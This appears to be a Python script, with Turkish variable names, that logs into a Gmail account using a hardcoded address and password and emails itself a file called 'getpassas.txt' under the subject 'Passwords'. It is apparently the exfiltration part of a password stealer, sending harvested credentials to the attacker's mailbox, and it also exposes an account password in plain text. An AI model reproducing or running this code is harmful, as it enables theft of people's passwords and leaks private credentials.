import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os.path

epostan = 'hasansigin159@gmail.com'
sifren = 'Hasan159753'
gonderen = 'hasansigin159@gmail.com'
baslik = 'Sifreler'
yazi = 'Sifreler bunlardir'
dosya = "getpassas.txt"

msg = MIMEMultipart()
msg['From'] = epostan
msg['To'] = gonderen
msg['Subject'] = baslik

msg.attach(MIMEText(yazi, 'plain'))

dosyadi = os.path.basename(dosya)
attachment = open(dosya, "rb")
part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; dosyadi= %s" % dosyadi)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(epostan, sifren)
text = msg.as_string()
server.sendmail(epostan, gonderen, text)
server.quit()